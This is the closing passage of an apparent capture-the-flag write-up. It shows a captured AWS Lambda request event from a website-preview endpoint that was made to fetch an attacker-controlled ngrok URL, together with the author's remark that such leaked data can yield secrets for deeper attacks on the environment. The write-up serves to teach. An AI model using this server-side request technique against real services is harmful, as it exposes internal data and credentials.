      "X-Forwarded-For":"my_external_ip, 130.176.32.142",
      "X-Forwarded-Port":"443",
      "X-Forwarded-Proto":"https"
   },
   "multiValueHeaders":{
      "Accept":[
         "application/json"
      ],
      "Accept-Encoding":[
         "deflate, gzip"
      ],
      "Accept-Language":[
         "fr"
      ],
      "authority":[
         "api.buggywebsite.com"
      ],
      "cache-control":[
         "no-cache"
      ],
      "CloudFront-Forwarded-Proto":[
         "https"
      ],
      "CloudFront-Is-Desktop-Viewer":[
         "true"
      ],
      "CloudFront-Is-Mobile-Viewer":[
         "false"
      ],
      "CloudFront-Is-SmartTV-Viewer":[
         "false"
      ],
      "CloudFront-Is-Tablet-Viewer":[
         "false"
      ],
      "CloudFront-Viewer-Country":[
         "TN"
      ],
      "content-type":[
         "application/json; charset=UTF-8"
      ],
      "Host":[
         "api.buggywebsite.com"
      ],
      "origin":[
         "http://social.buggywebsite.com"
      ],
      "pragma":[
         "no-cache"
      ],
      "Referer":[
         "http://social.buggywebsite.com/"
      ],
      "sec-fetch-dest":[
         "empty"
      ],
      "sec-fetch-mode":[
         "cors"
      ],
      "sec-fetch-site":[
         "cross-site"
      ],
      "User-Agent":[
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
      ],
      "Via":[
         "2.0 13dcb5d1ef6aaeefea92da59d4323d89.cloudfront.net (CloudFront)"
      ],
      "X-Amz-Cf-Id":[
         "Cb5d5Va22R85w7rrHeZ7khQ3n_vBK8IuRFrktUnRTyab_ZVqSviVpQ=="
      ],
      "X-Amzn-Trace-Id":[
         "Root=1-5f7c3a93-6ed3d32b2cf2f039039e4967"
      ],
      "X-Forwarded-For":[
         "my_external_ip, 130.176.32.142"
      ],
      "X-Forwarded-Port":[
         "443"
      ],
      "X-Forwarded-Proto":[
         "https"
      ]
   },
   "queryStringParameters":null,
   "multiValueQueryStringParameters":null,
   "pathParameters":null,
   "stageVariables":null,
   "requestContext":{
      "resourceId":"gd2rmm",
      "resourcePath":"/website-preview",
      "httpMethod":"POST",
      "extendedRequestId":"T-4XFGJRPHcFQJg=",
      "requestTime":"06/Oct/2020:09:36:19 +0000",
      "path":"/website-preview",
      "accountId":"010544439210",
      "protocol":"HTTP/1.1",
      "stage":"prod",
      "domainPrefix":"api",
      "requestTimeEpoch":1601976979604,
      "requestId":"c4267d87-70b7-411d-98ac-5e7f64abe688",
      "identity":{
         "cognitoIdentityPoolId":null,
         "accountId":null,
         "cognitoIdentityId":null,
         "caller":null,
         "sourceIp":"my_external_ip",
         "principalOrgId":null,
         "accessKey":null,
         "cognitoAuthenticationType":null,
         "cognitoAuthenticationProvider":null,
         "userArn":null,
         "userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
         "user":null
      },
      "domainName":"api.buggywebsite.com",
      "apiId":"a8643yamac"
   },
   "body":"{\"url\":\"http://fa5981907036.ngrok.io/bounty/index.html\",\"requestTime\":1601922502506}",
   "isBase64Encoded":false
} 
```

This info my sometimes include secrets of useful informations that will let you dig deeper into attacking the system's environment.

# Conclusion

The good thing with this challenge is teaching you to think the right way, and try to know what to target and what should you do to confirm it. I hope you liked my writeup, I was trying to let everyone be able to understand it and gain the knowledge needed for it. I haven't covered some of my fails during the process of solving this task so don't be upset if you made some mistakes a long the way. If you have any questions or you want to contact me, here is my discord: `Iy3dMejri#1997`. Thanks for your time and attention reading the writeup. See you in the next one.	